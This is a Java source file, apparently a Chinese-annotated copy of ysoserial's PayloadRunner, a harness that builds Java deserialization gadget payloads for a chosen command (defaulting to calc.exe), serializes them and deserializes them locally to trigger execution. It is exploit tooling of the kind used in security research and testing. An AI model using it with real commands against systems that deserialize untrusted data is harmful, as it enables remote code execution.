package Node.utils;

import Node.payload.ObjectPayload;
import Node.payload.URLDNS2;
import Node.secmgr.ExecCheckingSecurityManager;
import Node.ysoserial.Deserializer;
import Node.ysoserial.Serializer;


import java.util.concurrent.Callable;


/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
		// ensure payload generation doesn't throw an exception
        //拿到最终的序列化好的内容
		byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
			public byte[] call() throws Exception {
			    //获取要执行的命令，默认是windwos的calc.exe
				final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

				System.out.println("generating payload object(s) for command: '" + command + "'");
				//先反射拿到类，这里应该是为了统一进行动态加载，通过接口的方式来进行复用。
				ObjectPayload<?> payload = clazz.newInstance();
				//传入参数命令，并且将需要反序列化的类拿到
                final Object objBefore = payload.getObject(command);

				System.out.println("serializing payload");
                //获取序列化的后的内容
				byte[] ser = Serializer.serialize(objBefore);
				//释放资源
				ObjectPayload.Utils.releasePayload(payload, objBefore);
                return ser;
		}});

		try {
			System.out.println("deserializing payload");
			//反序列化
			final Object objAfter = Deserializer.deserialize(serialized);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

    private static String getDefaultTestCmd() {
	    return getFirstExistingFile(
	        "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        return "calc.exe";
//        for (String path : files) {
//            if (new File(path).exists()) {
//                return path;
//            }
//        }
//        throw new UnsupportedOperationException("no known test executable");
    }
}
